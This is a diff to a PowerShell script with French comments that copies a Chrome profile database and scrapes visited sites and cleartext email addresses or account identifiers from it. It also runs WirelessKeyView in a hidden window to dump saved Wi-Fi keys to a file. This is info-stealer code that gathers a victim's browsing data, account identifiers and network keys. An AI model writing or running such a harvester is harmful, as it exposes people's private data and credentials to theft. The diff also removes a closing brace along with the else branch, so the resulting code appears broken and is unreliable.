@@ -62,23 +62,40 @@ if (Test-Path $tempDb) {
     $dbBytes = [System.IO.File]::ReadAllBytes($tempDb)
     $textContent = [System.Text.Encoding]::UTF8.GetString($dbBytes)
 
-    $matches = [regex]::Matches($textContent, 'https?://[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}(?:/[^\s"]*)?')
+    # Recherche des URLs de manière plus stricte
+    $urls = [regex]::Matches($textContent, 'https?://[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}(?:/[^\s"]*)?')
     
     $cleanList = @()
-    foreach ($m in $matches) {
-        if ($m.Value -notmatch "google|gstatic|googleapis|apple|mozilla|microsoft") {
-            if ($cleanList -notcontains $m.Value) {
-                $cleanList += $m.Value
+    foreach ($u in $urls) {
+        $val = $u.Value
+        # On nettoie si l'URL embarque des paramètres trop longs ou des bouts de code HTML/JSON
+        if ($val -match "\?") {
+            $val = $val.Split("?")[0]
+        }
+        
+        if ($val -notmatch "google|gstatic|googleapis|apple|mozilla|microsoft|w3|schema" -and $val.Length -lt 100) {
+            if ($cleanList -notcontains $val) {
+                $cleanList += $val
                 Add-Content -Path $outputPath -Value "--------------------------------------------------"
-                Add-Content -Path $outputPath -Value "URL : $($m.Value)"
+                Add-Content -Path $outputPath -Value "Site : $val"
+            }
+        }
+    }
+
+    # Tentative de récupération des emails / identifiants en clair dans la base
+    $emails = [regex]::Matches($textContent, '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}')
+    $uniqueEmails = $emails | Select-Object -Unique -ExpandProperty Value
+    if ($uniqueEmails) {
+        Add-Content -Path $outputPath -Value "--------------------------------------------------"
+        Add-Content -Path $outputPath -Value "[+] Comptes / Emails détectés :"
+        foreach ($email in $uniqueEmails) {
+            if ($email -notmatch "google|example|mozilla") {
+                Add-Content -Path $outputPath -Value "  -> $email"
             }
         }
     }
 
     Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
-} else {
-    Add-Content -Path $outputPath -Value "[!] Aucun profil Chrome trouvé sur cette machine."
-}
 # Exécution des autres outils avec chemins absolus
 if (Test-Path "$basePath\WirelessKeyView.exe") {
     Start-Process -FilePath "$basePath\WirelessKeyView.exe" -ArgumentList "/stext $basePath\wifi.txt" -Wait -WindowStyle Hidden
